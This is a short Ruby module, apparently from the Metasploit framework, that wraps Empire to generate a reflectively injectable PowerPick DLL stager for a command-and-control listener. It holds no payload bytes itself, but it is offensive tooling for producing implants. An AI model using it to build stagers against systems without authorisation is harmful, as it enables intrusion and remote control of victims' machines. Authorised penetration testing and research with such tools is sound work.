##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Creates a PowerPick reflectively injectable DLL for Empire'
    ))
    register_options(
      [
        OptString.new(
        'PathToEmpire',
        [true,
         'Path to directory where Empire is cloned from mentioned repo and installed']
      )])
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.generate_dll(@listener_name, 'x86', @path)
    return @stagerCode
  end
end
